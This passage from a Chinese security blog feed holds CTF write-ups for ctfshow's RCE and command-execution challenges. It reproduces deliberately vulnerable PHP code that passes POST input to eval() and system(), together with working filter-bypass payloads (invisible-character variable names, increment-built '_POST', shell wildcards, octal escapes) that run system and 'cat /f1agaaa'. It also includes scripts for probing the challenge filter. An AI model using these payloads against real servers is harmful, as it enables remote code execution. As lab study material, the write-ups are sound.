/f1agaaa</span><br></pre></td></tr></table></figure><p><strong>%ff %fc  啥的是不可见字符</strong></p><p><img src="../images/6OR8G{3@$0C}Y(S_" alt="img">1JIJ[C.png)</p><p><strong>这里字母被过滤了，还可以利用不可见字符来给参数命名，学到了一个新知识点</strong></p><h2 id="RCE挑战4"><a href="#RCE挑战4" class="headerlink" title="RCE挑战4"></a>RCE挑战4</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">84</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z1-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220223437262.png" alt="image-20230220223437262"></p><p>这下子的话只有这些能进行利用了</p><p>少了个1，并且的话长度也进行了限制。</p><p>还是可以用<strong>rce3</strong>的方法，因为1没用到，并且只要在<strong>RCE3</strong>的基础上适当的缩短就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a=(_/_._)[0];//直接拼接成字符串并切片</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o=++<span class="variable">$a</span>;//<span class="variable">$o</span>=++<span class="variable">$a</span>是先把<span class="variable">$a</span>进行自增，自增完成之后再将值返回，也就是这一句结束的时候 <span class="variable">$a</span>和<span class="variable">$o</span>都是O</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o=++<span class="variable">$a</span>.<span class="variable">$o</span>;//<span class="variable">$o</span>=&gt;PO,<span class="variable">$a</span>=&gt;P</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a++;//Q</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a++;//R</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o.=++<span class="variable">$a</span>;//<span class="variable">$o</span>=&gt;POS,<span class="variable">$a</span>=&gt;S</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o.=++<span class="variable">$a</span>;//<span class="variable">$o</span>=&gt;POST,<span class="variable">$a</span>=&gt;T</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=_.<span class="variable">$o</span>;//_POST</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$_</span>[0]($<span class="variable">$_</span>[_]);//<span class="variable">$_POST</span>[0](<span class="variable">$_POST</span>[_]);</span></span><br></pre></td></tr></table></figure><p>这里的话还是利用不可见字符替代php变量名称(这里的payload得用bp发包，因为hackbar的话不会解析7f以后的字符)</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=(_/_._)[<span class="number">0</span>];$%fe=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;$%fe=%<span class="number">2</span>b%<span class="number">2</span>b$%ff.$%fe;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fe.=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;$%fe.=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;<span class="variable">$_</span>=_.$%fe;<span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[_]);&amp;<span class="number">0</span>=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><h2 id="RCE挑战5"><a href="#RCE挑战5" class="headerlink" title="RCE挑战5"></a>RCE挑战5</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220224606275.png" alt="image-20230220224606275"></p><p>这里的话是把01都给过滤掉了，长度也更短了</p><p>限制73个字符，而且0也不可以用了，但是这里观察到phpinfo安装了一个扩展gettext，该扩展支持函数<code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串。另外，其实数组下标使用未定义常量，php会warning，但是可以继续运行，并返回下标为0的字符（现象是这样但是实际机制需要看php源码）。其余知识点上面都已经讲过了，剩下的就是靠经验和积累对payload进行精简，下面是payload构造过程：</p><p><strong>EXP</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//相当于gettext(0/0)[0],得到N</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$a</span>.<span class="variable">$_</span>;<span class="comment">//_PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>.=++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><p>然后常规的替换成不可见字符变量名称，得到payload：</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=<span class="title function_ invoke__">_</span>(%ff/%ff)[%ff];<span class="variable">$_</span>=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;<span class="variable">$_</span>=_.%<span class="number">2</span>b%<span class="number">2</span>b$%ff.<span class="variable">$_</span>;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;<span class="variable">$_</span>.=%<span class="number">2</span>b%<span class="number">2</span>b$%ff.%<span class="number">2</span>b%<span class="number">2</span>b$%ff;<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[%ff]);&amp;_=system&amp;%ff=cat /f1agaaa</span><br></pre></td></tr></table></figure><h3 id="更短的payload-72位"><a href="#更短的payload-72位" class="headerlink" title="更短的payload(72位)"></a>更短的payload(72位)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//N</span></span><br><span class="line">++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>.++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><p><strong>payload1</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];%2b%2b$%ff;$_=$%ff.$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&amp;%ff=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO  相对于上一步，就是进行了这一步的修改</span></span><br></pre></td></tr></table></figure><p>至于为什么<code>$_=$a.$a++;</code>这一步得到的是PO而不是OP，或者OO，而<code>$_=_.$a.$a++;</code>得到的是<code>_OO</code>,经过和用这种做法的师傅们讨论，目前分析下来最有可能的原因是，PHP在做字符串拼接的过程中（.操作），是一个从左到右递归的过程，而<code>++</code>操作类似于一个函数，php在执行完函数后，再做拼接的操作，<code>$_=$a.$a++;//PO</code>这里相当于先执行了<code>$a++</code>操作（函数），并得到<code>$a++</code>的返回值，然后和左侧的<code>$a</code>变量进行拼接，此时<code>$a</code>已经是P了。而<code>$_=_.$a.$a++;</code>时先执行了<code>_</code>和<code>$a</code>的拼接，而后再执行<code>$_=&#39;_O&#39;.$a++</code>，所以得到的是<code>_OO</code>。*以上所有均为猜测，具体机制需研究PHP源码。</p><h3 id="68位字符"><a href="#68位字符" class="headerlink" title="68位字符"></a>68位字符</h3><p>目前在gettext环境下，最短的payload了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=_(a/a)[_];//N</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a=++<span class="variable">$_</span>;//O</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>]($<span class="variable">$a</span>[_]);//巧妙的把两次<span class="variable">$_</span>++放在一起</span></span><br></pre></td></tr></table></figure><p>这里的话php解析是从左到右递归的过程，这里有疑问的话一般都是<code>$a[$_++/$_++]</code>对这个有疑问，然后我就本地测试了一下，发现是这样的</p><p>就是<code>$a</code>的话是为O的，然后[P/Q]就会被解析成[0],然后$a[0]就是$a的值。</p><p><strong>可以本地跑一下看看结果。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=O;<span class="comment">//O</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[P/Q];</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230221183422744.png" alt="image-20230221183422744"></p><p><strong>payload</strong>(用不可见字符替代参数)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><p><strong>这上面的题目几乎全是有关于自增rce的</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow RCE极限挑战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-极限命令执行</title>
      <link href="/posts/85259dde.html"/>
      <url>/posts/85259dde.html</url>
      
        <content type="html"><![CDATA[<p>关于getFlag()函数的命令执行  <a href="https://www.anquanke.com/post/id/154284">文章</a></p><p>官方wp <a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">文章</a></p><h2 id="极限命令执行1"><a href="#极限命令执行1" class="headerlink" title="极限命令执行1"></a>极限命令执行1</h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里，或者直接运行根目录getflag</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;????????&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里首先跑一下正则，因为一些不知名原因，直接显示不出来，所有进行url加密以后去解密了。</span><br></pre></td></tr></table></figure><p>这里跑正则的意思是因为可以直接看哪些符号可以进行利用。</p><p><strong>代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">256</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以后遇到这种题就可以先去跑一下正则，看哪些可以进行利用</p><p><img src="../images/image-20230220104940596.png" alt="image-20230220104940596"></p><p>输出的<code>urlencode</code>编码的结果，然后进行解码查看</p><p><img src="../images/image-20230220105114058.png" alt="image-20230220105114058"></p><p><strong>只有这些可以进行利用</strong></p><p>这里题目提示的环境是<code>centos7</code>,那么在这个环境下是可以利用/进行命令执行的。</p><p><img src="../images/image-20230220105456573.png" alt="image-20230220105456573"></p><p><strong>/getflag</strong>是一个php的继承类方法，可以直接使用，会返回1</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">全称是  /bin/base64 flag.php  这里提示的是根目录，所以是/bin/base64 /flag</span><br><span class="line">payload1：ctf_show=/?????a?</span><br><span class="line">payload2：ctf_show=/???/?a??<span class="number">64</span> /??a?</span><br></pre></td></tr></table></figure><p><strong>这里考的是无字母进行rce，那么可以ctfshow的命令执行模块找到</strong></p><h2 id="极限命令执行2"><a href="#极限命令执行2" class="headerlink" title="极限命令执行2"></a>极限命令执行2</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里，或者直接运行根目录getflag</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里包含了个check.php,这里是先执行check()方法，在执行system()方法，那么我们可能会在check处进行类似die()方法一样进行终止，所以我们得想办法绕过。</p><p><img src="../images/image-20230220110524677.png" alt="image-20230220110524677"></p><p>测试的时候发现输入被过滤的内容时，会返回??????，所以我们可以写个python脚本来跑一下，看过滤了那些内容，还有看一下哪些内容可以进行利用。</p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="comment">#这里填写自己的靶机网址</span></span><br><span class="line">url = <span class="string">&quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span>= <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;ctf_show&#x27;</span>:<span class="built_in">chr</span>(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;??????&quot;</span> <span class="keyword">in</span> retext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>等1跑完的时候，就可以看到结果了。</p><p><img src="../images/image-20230220110934152.png" alt="image-20230220110934152"></p><p>只有这些可以进行利用，很明显，？被过滤了。</p><p>禁用了问号，不能使用通配符的方式了，但是可以通过<code>$&#39;\xxx&#39;</code>的方式执行命令，其中xxx是ascii字母的8进制值，比如<code>ls</code> 可以通过<code>$&#39;\154\163&#39;</code> 的方式进行执行。</p><p><img src="../images/image-20230220111453793.png" alt="image-20230220111453793"></p><p>值得注意的是，<strong>这种方案并不能解析带有参数的命令</strong>，所以本题提供了<code>/getflag</code>来方便大家执行。</p><p>这种题其实也可以使用16进制进行利用，但是这里把字母给过滤了，所以16进制就不能用了  —-&gt;  /x53  (16进制)</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$<span class="string">&#x27;\57\147\145\164\146\154\141\147&#x27;</span></span><br></pre></td></tr></table></figure><p>这里时getflag是题目给的，所以就可以构造/getflag </p><h2 id="极限命令执行3"><a href="#极限命令执行3" class="headerlink" title="极限命令执行3"></a>极限命令执行3</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是先跑下python脚本，看哪些被过滤了。</p><p><img src="../images/image-20230220113626987.png" alt="image-20230220113626987"></p><p>数字只剩下01可以进行利用了，那么我们就得想别的方法了，这里先想到的是构造数字，<strong>web57</strong>讲了一下</p><p><img src="../images/image-20230220113814158.png" alt="image-20230220113814158"></p><p>可以利用这个姿势进行构造。这里的话<strong>~</strong>是取反符号</p><p>这里补充一下一个知识点  <a href="https://blog.csdn.net/K346K346/article/details/86752313">Shell 双引号和单引号的区别</a></p><p>这里利用$~()来构造所需要的数字</p><p><strong>python脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">r&quot;\ 5 7 \ 1 4 7 \ 1 4 5 \ 1 6 4 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"> </span><br><span class="line">b = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&quot;\\&quot;</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;$((~$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * (<span class="built_in">int</span>(i)+ <span class="number">1</span>) + <span class="string">&quot;))))&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;\\\\&quot;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;$\\&#x27;&quot;</span>+<span class="built_in">str</span>+<span class="string">&quot;\\&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>以后如果想要修改啥的话，直接修改a里面的值就行了。</p><p>那么就可以拿到构造好的数字了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 